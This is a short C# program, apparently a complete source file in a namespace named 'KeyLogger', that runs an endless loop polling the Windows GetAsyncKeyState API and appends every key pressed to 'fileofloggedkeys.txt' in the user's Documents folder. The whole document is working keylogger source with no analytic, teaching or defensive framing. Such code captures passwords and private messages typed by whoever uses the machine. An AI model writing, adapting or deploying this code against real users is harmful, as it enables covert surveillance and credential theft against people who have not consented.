using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    static class Program
    {


        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public static void LogKeyStrokes()
        {
            while (true)
            {
                String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                if (!Directory.Exists(filepath))
                {
                    Directory.CreateDirectory(filepath);
                }
                string path = (filepath + @"\fileofloggedkeys.txt");

                if (!File.Exists(path))
                {
                    using (StreamWriter sw = File.CreateText(path)) ;
                }

                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state == -32767)
                    {

                        Console.WriteLine((Keys)i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine((Keys)i);
                        }

                    }
                }
            }
        }
        static void Main()
        {
            LogKeyStrokes();
        }

    }
}
